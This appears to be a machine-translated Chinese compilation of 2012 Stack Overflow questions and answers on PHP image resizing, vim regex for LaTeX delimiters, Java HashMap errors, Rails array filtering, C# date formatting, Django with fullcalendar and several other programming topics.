当然，Tridion 接受的任何模式都可以通过核心服务创建，但首先，我建议手动创建模式，然后使用代码来使用注释并实现更丰富的功能。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-04-09T10:09:35.467

您对 Mihai 的回答的评论表明您想要的是一种新的模式字段类型。Tridion 模式支持以下字段类型：

*   文本字段
*   数字字段
*   日期字段
*   嵌入式模式
*   外部链接
*   多媒体链接
*   组件链接

据我所知，添加到这个列表是不可能的。

为什么需要新的字段类型？也许通过更多细节，我们可以帮助您找到正确的解决方案。

在不了解更多信息的情况下，我能想到的只有应用程序数据。这是 Tridion 2011 的一项新功能，允许您针对任何 Tridion 项目设置自定义数据，但该数据在 Tridion GUI 中不可见。只能使用 API 设置和读取。

更多细节可以在[这里](https://www.sdltridionworld.com/community/2011_extensions/appdata.aspx)和[这里](http://tridionfanboy.wordpress.com/category/sdl-tridion/2011/core-service-2011/)找到。

如果您认为这对您没有帮助，请提供有关此要求原因的更多信息。

# php - 图像被拉伸

> ID：10069981
> 
> 赞同：0
> 
> 时间：2012-04-09T06:57:38.403
> 
> 标签：php

我正在从输入框中提交网站 url 获取所有图像。它可以工作，但我希望即使图像尺寸大于 100X100 或小于 100x100，也不要再拉伸此图像。我希望这张图片应该是 100X100 没有拉伸。

Suppose this src of my image "http://l.yimg.com/bt/api/res/1.2/vni2Ykd.HwvosAbFxUVzHQ--/YXBwaWQ9eW5ld3M7Y2g9MjAwOTtjcj0xO2N3PTMwODY7ZHg9MDtkeT0zOTA7Zmk9dWxjcm9wO2g9MjgwO3E9ODU7dz00MzA-/http://l.yimg.com/os/153/2012/ 04/08/142583283-10-jpg_170430.jpg"

我希望图像大小应该是 100X100。在我显示此图像时，它们是否具有创建缩略图的功能。或您拥有的任何其他解决方案。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T07:27:51.770

你可以试试这样...将下面的代码保存在resize.php中

调整大小.php

```
<?php

    /**

     * Image Resizer. 

     * @author : Harish Chauhan

     * @copyright : Freeware

     * About :This PHP script will resize the given image and can show on the fly or save as image file.

     *

     */

    define("HAR_AUTO_NAME",1);  

    Class RESIZEIMAGE

    {

        var $imgFile="";

        var $imgWidth=0;

        var $imgHeight=0;

        var $imgType="";

        var $imgAttr="";

        var $type=NULL;

        var $_img=NULL;

        var $_error="";

        /**

         * Constructor

         *

         * @param [String $imgFile] Image File Name

         * @return RESIZEIMAGE (Class Object)

         */

        function RESIZEIMAGE($imgFile="")

        {
            if (!function_exists("imagecreate"))

            {

                $this->_error="Error: GD Library is not available.";

                return false;

            }

            $this->type=Array(1 => 'GIF', 2 => 'JPG', 3 => 'PNG', 4 => 'SWF', 5 => 'PSD', 6 => 'BMP', 7 => 'TIFF', 8 => 'TIFF', 9 => 'JPC', 10 => 'JP2', 11 => 'JPX', 12 => 'JB2', 13 => 'SWC', 14 => 'IFF', 15 => 'WBMP', 16 => 'XBM');

            if(!empty($imgFile))

                $this->setImage($imgFile);

        }

        /**

         * Error occured while resizing the image.

         *

         * @return String 

         */

        function error()

        {

            return $this->_error;

        }

        /**

         * Set image file name

         *

         * @param String $imgFile

         * @return void

         */

        function setImage($imgFile)

        {

            $this->imgFile=$imgFile;

            return $this->_createImage();

        }

        /**

         * 

         * @return void

         */

        function close()

        {

            return @imagedestroy($this->_img);

        }

        /**

         * Resize a image to given width and height and keep it's current width and height ratio

         * 

         * @param Number $imgwidth

         * @param Numnber $imgheight

         * @param String $newfile

         */

        function resize_limitwh($imgwidth,$imgheight,$newfile=NULL)

        {

            $image_per = 100;

            list($width, $height, $type, $attr) = @getimagesize($this->imgFile);

            if($width > $imgwidth && $imgwidth > 0)

                $image_per = (double)(($imgwidth * 100) / $width);

            if(floor(($height * $image_per)/100)>$imgheight && $imgheight > 0)

                $image_per = (double)(($imgheight * 100) / $height);

            $this->resize_percentage($image_per,$newfile);

        }

        /**

         * Resize an image to given percentage.

         *

         * @param Number $percent

         * @param String $newfile

         * @return Boolean

         */

        function resize_percentage($percent=100,$newfile=NULL)

        {

            $newWidth=($this->imgWidth*$percent)/100;

            $newHeight=($this->imgHeight*$percent)/100;

            return $this->resize($newWidth,$newHeight,$newfile);

        }

        /**

         * Resize an image to given X and Y percentage.

         *

         * @param Number $xpercent

         * @param Number $ypercent

         * @param String $newfile

         * @return Boolean

         */

        function resize_xypercentage($xpercent=100,$ypercent=100,$newfile=NULL)

        {

            $newWidth=($this->imgWidth*$xpercent)/100;

            $newHeight=($this->imgHeight*$ypercent)/100;

            return $this->resize($newWidth,$newHeight,$newfile);

        }

        /**

         * Resize an image to given width and height

         *

         * @param Number $width

         * @param Number $height

         * @param String $newfile

         * @return Boolean

         */

        function resize($width,$height,$newfile=NULL)

        {

            if(empty($this->imgFile))

            {

                $this->_error="File name is not initialised.";

                return false;

            }

            if($this->imgWidth<=0 || $this->imgHeight<=0)

            {

                $this->_error="Could not resize given image";

                return false;

            }

            if($width<=0)

                $width=$this->imgWidth;

            if($height<=0)

                $height=$this->imgHeight;

            return $this->_resize($width,$height,$newfile);

        }

        /**

         * Get the image attributes

         * @access Private

         *      

         */

        function _getImageInfo()

        {

            @list($this->imgWidth,$this->imgHeight,$type,$this->imgAttr)=@getimagesize($this->imgFile);

            $this->imgType=$this->type[$type];

        }

        /**

         * Create the image resource 

         * @access Private

         * @return Boolean

         */

        function _createImage()

        {

            $this->_getImageInfo($this->imgFile);

            if($this->imgType=='GIF')

            {

                $this->_img=@imagecreatefromgif($this->imgFile);

            }

            elseif($this->imgType=='JPG')

            {

                $this->_img=@imagecreatefromjpeg($this->imgFile);

            }

            elseif($this->imgType=='PNG')

            {

                $this->_img=@imagecreatefrompng($this->imgFile);

            }           

            if(!$this->_img || !@is_resource($this->_img))

            {

                $this->_error="Error loading ".$this->imgFile;

                return false;

            }

            return true;

        }

        /**

         * Function is used to resize the image

         * 

         * @access Private

         * @param Number $width

         * @param Number $height

         * @param String $newfile

         * @return Boolean

         */

        function _resize($width,$height,$newfile=NULL)

        {

            if (!function_exists("imagecreate"))

            {

                $this->_error="Error: GD Library is not available.";

                return false;

            }

            $newimg=@imagecreatetruecolor($width,$height);

            //imagecolortransparent( $newimg, imagecolorat( $newimg, 0, 0 ) );

            if($this->imgType=='GIF' || $this->imgType=='PNG')

            {

                /** Code to keep transparency of image **/

                $colorcount = imagecolorstotal($this->_img);

                if ($colorcount == 0) $colorcount = 256;

                imagetruecolortopalette($newimg,true,$colorcount);

                imagepalettecopy($newimg,$this->_img);

                $transparentcolor = imagecolortransparent($this->_img);

                imagefill($newimg,0,0,$transparentcolor);

                imagecolortransparent($newimg,$transparentcolor); 

            }

            @imagecopyresampled ( $newimg, $this->_img, 0,0,0,0, $width, $height, $this->imgWidth,$this->imgHeight);

            if($newfile===HAR_AUTO_NAME)

            {

                if(@preg_match("/\..*+$/",@basename($this->imgFile),$matches))

                    $newfile=@substr_replace($this->imgFile,"_har",-@strlen($matches[0]),0);            

            }

            elseif(!empty($newfile))

            {

                if(!@preg_match("/\..*+$/",@basename($newfile)))

                {

                    if(@preg_match("/\..*+$/",@basename($this->imgFile),$matches))

                       $newfile=$newfile.$matches[0];

                }

            }

            if($this->imgType=='GIF')

            {

                if(!empty($newfile))

                    @imagegif($newimg,$newfile);

                else

                {

                    @header("Content-type: image/gif");

                    @imagegif($newimg);

                }

            }

            elseif($this->imgType=='JPG')

            {

                if(!empty($newfile))

                    @imagejpeg($newimg,$newfile);

                else

                {

                    @header("Content-type: image/jpeg");

                    @imagejpeg($newimg);

                }

            }

            elseif($this->imgType=='PNG')

            {

                if(!empty($newfile))

                    @imagepng($newimg,$newfile);

                else

                {

                    @header("Content-type: image/png");

                    @imagepng($newimg);

                }

            }

            @imagedestroy($newimg);

        }

    }

?> 
```

在您的代码中包含文件 resize.php 并使用以下代码调整图像的大小或创建缩略图

```
include "resize.php";
$path = "your image path";
$newname = "your image name to be resized";

$rimg=new RESIZEIMAGE("$path/$newname");
$width = $rimg->imgWidth;
if($width > 800){
    $per = round(800/$width*100);  
    $rimg->resize_percentage($per,"$path/$newname"); //resize image
}
$rimg->resize(100,100,"$path/$newname"); //create thumbnail for an image
$rimg->close(); 
```

# vim - 如何将字符串 $foo$ 转换为 \(foo\) 并将 $$bar$$ 转换为 \[bar\]

> ID：10069982
> 
> 赞同：4
> 
> 时间：2012-04-09T06:57:43.140
> 
> 标签：vim, latex

一切都在标题中。我有许多用相当过时的语法编写的 LaTeX 文件`$foo$`，`$$bar$$`我希望将它们分别转换为`\\(foo\\)`和`\\[bar\\]`. 我正在使用 vim，所以我想一个正则表达式就可以了，但一个脚本也很好。我一直在环顾四周，但没有成功。

编辑：在 kirilloid 的有用回复之后，我想提一下，我也想在这种情况下使用它，`foo`不仅`bar`是单词，而且是包含空格的表达式（但`$`显然没有 s）。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T07:06:50.597

一切都应该被转义：`$`已经是一个元字符，应该被转义。`()+`应该逃脱工作，因为它们通常在正则表达式中工作。

```
:%s/\$\$\(\w\+\)\$\$/\\[\1\\]/g
:%s/\$\(\w\+\)\$/\\(\1\\)/g 
```

[http://vim.wikia.com/wiki/Search_and_replace](http://vim.wikia.com/wiki/Search_and_replace)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-09T14:32:36.623

采用

```
:%s/\V$$\v(\_.{-})\V$$/\\[\1\\]/g
:%s/\v\$([^$]+)\$/\\(\1\\)/g 
```

与@kirilloid 答案的区别如下：

1.  使用非常神奇（`\v`，禁用需要转义大多数元字符）和非常nomagic（除了反斜杠之外的所有内容都有其字面意义）模式以提高可读性
2.  处理多行`$$`字符串的能力（`\_`添加换行符`.`，`\_.`是唯一真正意味着*任何字符*的构造，`.`不包括换行符）。`{-}`（`\{-}`在魔法、游牧和非常游牧模式中）是`*`.
3.  这些字符串之间可能有任何字符（`$`: 除换行符之外的任何字符），但它要求您确保`$$`始终以大纲公式开头并且`$`始终以内联公式开头。`%`您可能希望通过在 command 前面替换为`{first_line_number},{last_line_number}`或在视觉上选择它们，键入`:`（`'<,'>`将出现在命令行的开头）并继续键入`s/...`command 而不用前导来将替换限制为正确的行`:%`。

# ajax - Ajax POST 不工作，而 GET 在 phonegap 中工作正常

> ID：10069984
> 
> 赞同：0
> 
> 时间：2012-04-09T06:57:52.943
> 
> 标签：ajax, web-services, post, cordova, soapui

这是我的代码

```
$
.ajax({
    cache : false,
    type : 'POST',//While GET working
    async: false,
    url : "http://192.168.1.198:9051/something.xml" + "?time=" + Date.now(),
    data : {
        key : "value"
        },
    dataType : "xml",
    success : function(xml) {
            },
    error : function(xhr, ajaxOptions, thrownError) {
        alert(xhr.status);
    alert(thrownError);
    }
}); 
```

这给了我错误

对于警报（xhr.status）；------------> 200

for alert(thrownError);----------> 错误：无效的 XML

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-16T11:36:30.527

我把它整理出来......我传递了一些错误的 xml 作为请求......

# java - 在 HasHMap 中插入和元素时出现 IndexOutOfBound 异常

> ID：10069985
> 
> 赞同：1
> 
> 时间：2012-04-09T06:57:54.893
> 
> 标签：java, jakarta-ee, java-ee-6

我需要一些帮助来理解这里发生的事情。我在将元素插入 Map 时收到“IndexOutOfBoundsException”。这里是堆栈跟踪。

```
 java.lang.IndexOutOfBoundsException: Index: 192, Size: 192
        at java.util.ArrayList.RangeCheck(ArrayList.java:547)
        at java.util.ArrayList.get(ArrayList.java:322)
        at somepackage.SequentialMap.getKey(Unknown Source)
        at somepackage.SequentialIterator.next(Unknown Source)
        at java.util.HashMap.buildCache(HashMap.java:590)
        at java.util.HashMap.resize(HashMap.java:576)
        at java.util.HashMap.addEntry(HashMap.java:939)
        at java.util.HashMap.put(HashMap.java:477)
        at somepackage.SequentialMap.put(Unknown Source)
        at somepackage.BatchBurstingInfo.parseContents(Unknown Source)
        at somepackage.BatchBurstingInfo.parse(Unknown Source)
        at somepackager.BatchBurstingInfo.setFileContents(Unknown Source)
        at somepackage.BurstingListBean.setMembers(Unknown Source) 
```

上面的 SeqentialMap 扩展了 HashMap 。
在这里，我们试图插入一个大于 200 的对象列表。问题是当我在使用 JDK 1.6 的开发设置中运行时它工作正常，但在 weblogic 服务器中，我总是在相同的步骤中得到这个异常。
另外，在调试时，我在 HashMap 类中找不到任何 buildCache 方法，这是否意味着 weblogic JDK 是一些不同版本的 og 实现。

这是代码片段

```
public class SequentialMap extends HashMap
{
    private ArrayList m_keys = new ArrayList();

    /**
     * Removes the mapping for this key from this map if present.
     *
     * @param  key key whose mapping is to be removed from the map.
     * @return previous value associated with specified key, or <tt>null</tt>
     *         if there was no mapping for key.  A <tt>null</tt> return can
     *         also indicate that the map previously associated <tt>null</tt>
     *         with the specified key.
     */
    public Object remove(Object key) 
    {
        synchronized(this)
        {
                if(m_keys != null)
            {
                int iSize = m_keys.size();
                ArrayList oNewArray = new ArrayList();
                for(int i = 0; i < iSize; i++)
                {
                        if(m_keys.get(i).equals(key) == false)
                    {
                            oNewArray.add(m_keys.get(i));
                    }
                }
                m_keys = oNewArray;
            }
            return super.remove(key);
        }
    }   

    /**
     * Returns a collection view of the values contained in this map.  The
     * collection is backed by the map, so changes to the map are reflected in
     * the collection, and vice-versa.  The collection supports element
     * removal, which removes the corresponding mapping from this map, via the
     * <tt>Iterator.remove</tt>, <tt>Collection.remove</tt>,
     * <tt>removeAll</tt>, <tt>retainAll</tt>, and <tt>clear</tt> operations.
     * It does not support the <tt>add</tt> or <tt>addAll</tt> operations.
     *
     * @return a collection view of the values contained in this map.
     */
    /*public Collection values() 
    {
    }*/
    /**
     * Returns a collection view of the mappings contained in this map.  Each
     * element in the returned collection is a <tt>Map.Entry</tt>.  The
     * collection is backed by the map, so changes to the map are reflected in
     * the collection, and vice-versa.  The collection supports element
     * removal, which removes the corresponding mapping from the map, via the
     * <tt>Iterator.remove</tt>, <tt>Collection.remove</tt>,
     * <tt>removeAll</tt>, <tt>retainAll</tt>, and <tt>clear</tt> operations.
     * It does not support the <tt>add</tt> or <tt>addAll</tt> operations.
     *
     * @return a collection view of the mappings contained in this map.
     * @see Map.Entry
     */
    public Set entrySet() 
    {
            return super.entrySet();
    }

    /**
     * Removes all mappings from this map.
     */
    public void clear() 
    {
            synchronized(this)
        {
            m_keys.clear();
            super.clear();
        }
    }

    /**
     * Associates the specified value with the specified key in this map.
     * If the map previously contained a mapping for this key, the old
     * value is replaced.
     *
     * @param key key with which the specified value is to be associated.
     * @param value value to be associated with the specified key.
     * @return previous value associated with specified key, or <tt>null</tt>
     *         if there was no mapping for key.  A <tt>null</tt> return can
     *         also indicate that the HashMap previously associated
     *         <tt>null</tt> with the specified key.
     */
    public Object put(Object key, Object value) 
    {
        int iExistingIndex = this.getKeyIndex(key);
        Object oldObj = super.put(key, value);
        if(iExistingIndex == -1)
        {
            m_keys.add(key);
        }
        else
        {
                m_keys.add(iExistingIndex, key);
        }

        return oldObj;
    }

    /**
     * Returns a set view of the keys contained in this map.  The set is
     * backed by the map, so changes to the map are reflected in the set, and
     * vice-versa.  The set supports element removal, which removes the
     * corresponding mapping from this map, via the <tt>Iterator.remove</tt>,
     * <tt>Set.remove</tt>, <tt>removeAll</tt>, <tt>retainAll</tt>, and
     * <tt>clear</tt> operations.  It does not support the <tt>add</tt> or
     * <tt>addAll</tt> operations.
     *
     * @return a set view of the keys contained in this map.
     */
    public Set keySet() 
    {
        Set oSet = super.keySet();
        final SequentialMap oThis = this;
        HashSet oNewSet = new HashSet(oSet){
            /**
             * Returns an iterator over the elements in this set.  The elements
             * are returned in no particular order.
             *
             * @return an Iterator over the elements in this set.
             * @see ConcurrentModificationException
             */
            public Iterator iterator() {
                return new SequentialIterator(oThis);
            }
        };

        return oNewSet;
    }

    protected int getKeyIndex(Object key)
    {
        int index = -1;

            if(m_keys != null)
        {
            int iSize = m_keys.size();
            for(int i = 0; i < iSize; i++)
            {
                if(m_keys.get(i).equals(key))
                {
                        index = i;
                        break;
                }
            }
        }

        return index;
    }

    Object getKey(int index)
    {
            return m_keys.get(index);
    }
}

class SequentialIterator implements Iterator
{
    private SequentialMap m_oMap = null;
    private int m_iCurrentIndex = 0;

        SequentialIterator(SequentialMap oMap)
    {
            this.m_oMap = oMap;
    }
    /**
     * Returns <tt>true</tt> if the iteration has more elements. (In other
     * words, returns <tt>true</tt> if <tt>next</tt> would return an element
     * rather than throwing an exception.)
     *
     * @return <tt>true</tt> if the iterator has more elements.
     */
    public boolean hasNext() {
            return (m_iCurrentIndex < m_oMap.size());
    }
    /**
     * Returns the next element in the iteration.
     *
     * @return the next element in the iteration.
     * @exception NoSuchElementException iteration has no more elements.
     */
    public Object next() {
        Object key = m_oMap.getKey(m_iCurrentIndex);
        m_iCurrentIndex++;
        return key;
    }
    /**
     *
     * Removes from the underlying collection the last element returned by the
     * iterator (optional operation).  This method can be called only once per
     * call to <tt>next</tt>.  The behavior of an iterator is unspecified if
     * the underlying collection is modified while the iteration is in
     * progress in any way other than by calling this method.
     *
     * @exception UnsupportedOperationException if the <tt>remove</tt>
     *        operation is not supported by this Iterator.

     * @exception IllegalStateException if the <tt>next</tt> method has not
     *        yet been called, or the <tt>remove</tt> method has already
     *        been called after the last call to the <tt>next</tt>
     *        method.
     */
    public void remove() {
            Object key = m_oMap.getKey(m_iCurrentIndex - 1);
        m_oMap.remove(key);
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T08:03:50.523

我猜您的 Weblogic 使用的是旧版本的 JRockit。我检查[了最后一个版本的源代码](http://docs.oracle.com/cd/E13188_01/jrockit/docs142/demo_src.html)，他们不再使用这个 buildCache。

我不确定，但我认为如果你替换它：

```
public boolean hasNext() {
        return (m_iCurrentIndex < m_oMap.size());
} 
```

对于这个实现：

```
public boolean hasNext() {
        return (m_iCurrentIndex < m_keys.size());
} 
```

你不会有这个错误。

`NoSuchElementException`如果没有下一个元素，您还需要抛出一个on next() 方法，而不是抛出一个`IndexOutOfBoundsException`当前实现正在执行的操作。

添加这样的东西

```
if (!hasNext()) {
    throw new NoSuchElementException();
} 
```

# extjs - 如何根据我们在 extjs 中的要求在组合框中获取我们自己的建议值？

> ID：10069987
> 
> 赞同：0
> 
> 时间：2012-04-09T06:58:10.040
> 
> 标签：extjs, extjs3

我有一个要求，例如，

我必须根据我的要求，用我自己的方法过滤一个包含建议值的组合框列表。

在组合框中有一个下拉列表。当我们输入任何文本字符（如“b”）时，extjs 会过滤列表...这将显示所有以“b”开头的单词。

要求：

在组合框中过滤值时，“？”（问号）指定从 a 到 z 和 0 到 9 的任何匹配项

示例：我有一个值列表，例如

```
1.raja 
2.123 
3.ram 
4.1021 
```

1.  如果我在组合框中输入“？” 它应该显示所有值

2.  如果我输入 '?a' 它应该显示 raja,ram

3.  如果我输入“？2？” 它应该显示 123

4.  如果我输入 '?0?1' 它应该显示 1021

谢谢，

拉贾塞卡

# r - 在每个特定时间间隔之后调度 r 个函数

> ID：10069989
> 
> 赞同：4
> 
> 时间：2012-04-09T06:58:16.967
> 
> 标签：r

我有一个 r 函数，我想在每个预定义的时间间隔（例如每 5 分钟后）自动运行（调度）它是否有可能，如果是，那么如何完成。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-04-09T07:57:53.720

理想情况下，您应该为此使用系统调度程序：Unix 系统上的 cron 或 Windows 系统上的 Scheduled Tasks。

可能有一些要求意味着您不能为函数的每次调用生成一个新进程。如果是这样，则使用无限循环并调用 Sys.sleep() 以等待下一次调用到期。

```
repeat {
    startTime <- Sys.time()
    runFunction()
    sleepTime <- startTime + 5*60 - Sys.time()
    if (sleepTime > 0)
        Sys.sleep(sleepTime)
} 
```

# ruby-on-rails - Rails 按属性值过滤对象数组

> ID：10069993
> 
> 赞同：104
> 
> 时间：2012-04-09T06:58:48.523
> 
> 标签：ruby-on-rails, activerecord

所以我对数据库执行查询，我有一个完整的对象数组：

```
@attachments = Job.find(1).attachments 
```

现在我有一个对象数组，我不想执行另一个数据库查询，但我想根据`Attachment`对象过滤数组，`file_type`这样我就可以有一个`attachments`文件类型列表，`'logo'`然后是另一个列表`attachments`文件类型是`'image'`

像这样的东西：

```
@logos  = @attachments.where("file_type = ?", 'logo')
@images = @attachments.where("file_type = ?", 'image') 
```

但是在内存中而不是数据库查询中。

* * *

## 回答 #1

> 赞同：182
> 
> 时间：2012-04-09T11:16:39.460

尝试 ：

这可以 ：

```
@logos = @attachments.select { |attachment| attachment.file_type == 'logo' }
@images = @attachments.select { |attachment| attachment.file_type == 'image' } 
```

但出于性能方面的考虑，您不需要重复 @attachments 两次：

```
@logos , @images = [], []
@attachments.each do |attachment|
  @logos << attachment if attachment.file_type == 'logo'
  @images << attachment if attachment.file_type == 'image'
end 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-04-09T10:22:18.410

如果您的附件是

```
@attachments = Job.find(1).attachments 
```

这将是附件对象的数组

使用 select 方法根据 file_type 进行过滤。

```
@logos = @attachments.select { |attachment| attachment.file_type == 'logo' }
@images = @attachments.select { |attachment| attachment.file_type == 'image' } 
```

这不会触发任何数据库查询。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-09T07:07:58.487

您是否尝试过急切加载？

```
@attachments = Job.includes(:attachments).find(1).attachments 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2021-06-10T06:24:18.903

对于较新版本的 ruby​​，您可以使用

```
@logos = @attachments.filter { |attachment| attachment.file_type == 'logo' } 
```

参考：[https ://apidock.com/ruby/Array/filter](https://apidock.com/ruby/Array/filter)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-03-12T11:48:00.333

您可以使用 where 过滤

```
Job.includes(:attachments).where(file_type: ["logo", "image"]) 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2019-06-12T15:07:24.193

我会稍微不同。构造您的查询以仅检索您需要的内容并从那里拆分。

因此，使您的查询如下：

```
#                                vv or Job.find(1) vv
attachments = Attachment.where(job_id: @job.id, file_type: ["logo", "image"])
# or 
Job.includes(:attachments).where(id: your_job_id, attachments: { file_type: ["logo", "image"] }) 
```

然后对数据进行分区：

```
@logos, @images = attachments.partition { |attachment| attachment.file_type == "logo" } 
```

这将以简洁有效的方式获得您所追求的数据。

# c# - 如何在 C# 中获取当前日期？

> ID：10069995
> 
> 赞同：1
> 
> 时间：2012-04-09T06:59:31.953
> 
> 标签：c#, datetime, format

我正在使用 Visual Studio 2010 开发我的 Windows 手机应用程序！我是新手，我不知道如何以下列格式显示当前日期

例如

我用

> String.Format("{0:dd/MM/yyyy}",date);

输出：

> 09/04/2012（这个日期是我的日期时间格式）

但是，我想确切地说是（只有没有“0”的日期）：

> 9

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T07:01:51.617

那么一个选择就是：

```
string text = date.Day.ToString(); 
```

或者，如果您仍想使用日期/时间格式，您可以使用：

```
string text = string.Format("{0:%d}", date); 
```

请注意，此处`%`需要指定您希望`d`是单个字符的[*自定义*格式字符串](http://msdn.microsoft.com/en-us/library/8kb3ddd4.aspx)，而不仅仅是[标准格式字符串](http://msdn.microsoft.com/en-us/library/az4se3k1.aspx)（其中的`d`意思是“短日期字符串”）。

如果您想要其余的日期格式，但*只想*更改月份日期的表示方式，您可以将其更改`dd`为`d`：

```
string text = string.Format("{0:d/MM/yyyy}", date); 
```

# jquery - 在 django 应用程序中使用 jquery fullcalendar

> ID：10069997
> 
> 赞同：1
> 
> 时间：2012-04-09T07:00:09.443
> 
> 标签：jquery, django, calendar

我正在使用[fullcalendar](http://arshaw.com/fullcalendar/) `jquery`库在我的`django`博客应用程序页面中显示日历。我有一些`Post`由登录创建的 s，`user`并希望向他展示每个月的日历视图，其中`number of posts`由他在每一天制作，如果没有发布，则为 0在特定的一天。

我已经包含了库中给出的`javascript`和`css`文件，`fullcalendar`并且我的页面成功显示了日历。但是你如何将数据从`django`视图传递到日历？当我检查 html 页面的源时，我看到日历是由 html 表制成。

有没有人做过类似的事情？你能建议如何在每个日历日单元格上显示帖子数量吗？

我试图想一个这样的解决方案，对于一个特定的月份，我可能需要得到一个`dict`where 键是天（例如：4 月 1 日）并且值是

```
len(Post.objects.filter(month='april' ,day='1')) 
```

并将其传递`dict`给响应（呈现上面的 html 页面）。但是我怎样才能让日历从这个字典中获取每个值并将其显示在适当的单元格中呢？

如果我的想法有问题，请纠正我。

我选择`fullcalendar`脚本是因为它看起来不错..但我不需要任何与事件相关的功能..所以我对更简单的灵魂持开放态度。如果你认为 fullcalendar 是矫枉过正，请建议一个更简单的替代方案

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-10T13:16:27.927

您需要提供完整的日历“事件”数据，这可能是帖子的数量，并且将呈现为事件。根据文档，它可能采用不同的格式，例如 js 数组。您只需将该数据传递到模板中。模板可能如下所示：

```
<script>
    ...
    $('#calendar').fullCalendar({
        events: {{ posts_counts|safe }}
    });
    ...
</script> 
```

`posts_counts`fullcalendar 支持的格式的字典数组在哪里，看[这里](http://arshaw.com/fullcalendar/docs/event_data/events_array/)。

视图可能看起来像这样。这是一个粗略的例子，只是为了展示它是如何完成的：

```
def calendar(request):
    posts_counts = []
    for i in (1, 31):
        posts_counts.append({'title': len(Post.objects.filter(month='april', day=i)),
                             'start': '2012-04-%d' % i,
                             'end': '2012-04-%d' % i})
    return render(request, 'calendar_template.html',
                  {'posts_counts': simplejson.dumps(posts_counts)}) 
```

然后，您页面上的 fullcalendar 应使用帖子数作为事件进行初始化。然后您可能可以自定义日历外观，禁用事件拖放等。

您找到帖子数量的解决方案将生成大量 SQL 查询，最好考虑一个更好的解决方案。

# java - 数据库创建需要时间

> ID：10069998
> 
> 赞同：0
> 
> 时间：2012-04-09T07:00:17.530
> 
> 标签：java, database, derby

我正在创建一个应用程序，我在其中创建了一个队列以处理任何操作。首先，我创建队列数据库以及显示该过程的窗口。但是除非没有创建我的数据库，否则我看不到队列窗口。在这个过程中，总共需要 10 秒。在 10 秒内创建数据库大约需要 8 秒，其余时间由数据获取器和设置器占用。所以我想知道我可以减少数据库创建时间。我正在使用 Java Derby 作为数据库。

**创建数据库**- （大约 7.569 秒）

objConnectionPool = new ConnectionPool("jdbc:derby:" + sFolder.getAbsolutePath() + "/operationqueue" + sDBFileName, null, null, "org.apache.derby.jdbc.EmbeddedDriver");

**创建表**（大约 800 毫秒）

String sQry = "CREATE TABLE " + sTableName + " (id INTEGER PRIMARY KEY, aaa VARCHAR(32672) ,bbb VARCHAR(25),ccc VARCHAR(25),report VARCHAR(32672),size DOUBLE, fName VARCHAR(10000)) ";

PreparedStatement ps = objConnection.prepareStatement(sQuery); int iUpdate = ps.executeUpdate();

谢谢

# jquery-mobile - 如何通过 jquery mobile 集成 Google 日历。？

> ID：10069999
> 
> 赞同：0
> 
> 时间：2012-04-09T07:00:22.287
> 
> 标签：jquery-mobile, google-calendar-api

请让我知道如何通过 jquery mobile 将谷歌日历集成到应用程序中。是否有任何 api 可以做到这一点。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T12:09:43.247

[是的，您可以在此处](https://developers.google.com/google-apps/calendar/)找到 Google Calendar API 。您可以简单地使用 jQuery AJAX 请求从 Google 获取数据，对其进行解析并将结果显示在您的 jQuery Mobile 页面上。